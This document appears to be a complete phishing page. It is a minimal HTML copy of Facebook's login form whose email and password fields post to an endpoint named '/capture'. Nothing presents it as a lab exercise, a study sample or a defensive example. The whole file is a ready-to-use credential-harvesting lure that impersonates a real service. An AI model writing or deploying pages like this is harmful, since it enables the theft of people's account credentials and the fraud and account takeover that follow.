<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title></head>
<body>
<div style="width:300px;margin:100px auto;">
<h2>Facebook</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or Phone" style="width:100%;padding:8px;margin:5px 0;"><br>
<input type="password" name="pass" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;"><br>
<button type="submit" style="width:100%;padding:8px;">Log In</button>
</form>
</div>
</body>
</html>
